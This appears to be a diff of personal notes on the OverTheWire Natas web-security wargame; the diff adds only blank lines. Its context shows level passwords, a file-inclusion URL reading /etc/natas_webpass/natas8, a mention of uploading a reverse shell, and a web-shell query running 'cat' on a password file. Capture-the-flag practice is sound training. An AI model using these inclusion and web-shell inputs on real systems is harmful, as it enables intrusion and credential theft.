@@ -118,6 +118,7 @@ Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
 
 
 
+
 lvl 8:
 -----------
 click home / about
@@ -131,6 +132,8 @@ http://natas7.natas.labs.overthewire.org/index.php?page=home
 http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
 ->
 a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB 
+
+
 
 
 lvl 9:
@@ -176,6 +179,8 @@ Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
 
 
 
+
+
 lvl 10:
 -----------
 ->
@@ -183,6 +188,7 @@ lvl 10:
 ->
 D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
 ->
+
 
 
 
@@ -333,6 +339,13 @@ echo xor_decrypt(base64_decode('MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4q
 ->
 YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
 
+
+
+
+
+
+
+
 lvl 13:
 -----------
 ->
@@ -426,6 +439,13 @@ what we need to do to upload a reverse shell:
 lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
 ->
 
+
+
+
+
+
+
+
 lvl 14:
 -----------
 ->
@@ -466,6 +486,12 @@ example ?cmd=xxd 06r1r0cxys.php
 ?cmd=cat /etc/natas_webpass/natas14
 ->
 qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
+
+
+
+
+
+
 
 
 lvl 15:
